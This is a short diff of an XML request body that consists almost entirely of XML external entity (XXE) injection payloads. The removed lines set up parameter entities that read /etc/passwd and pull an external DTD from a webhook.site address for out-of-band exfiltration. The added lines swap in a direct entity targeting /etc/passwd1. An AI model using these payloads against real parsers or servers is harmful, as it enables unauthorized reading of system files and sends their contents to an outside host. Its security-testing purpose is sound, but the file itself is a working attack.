@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <!DOCTYPE foo [
-<!ENTITY % b SYSTEM "file:///etc/passwd">
-<!ENTITY % asd SYSTEM "https://webhook.site/c56eb8fb-c218-4977-a0c5-373566eec2f6"> %asd; %rrr;]>
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>
 <params>
 <offset>0</offset>
 <queryParams>
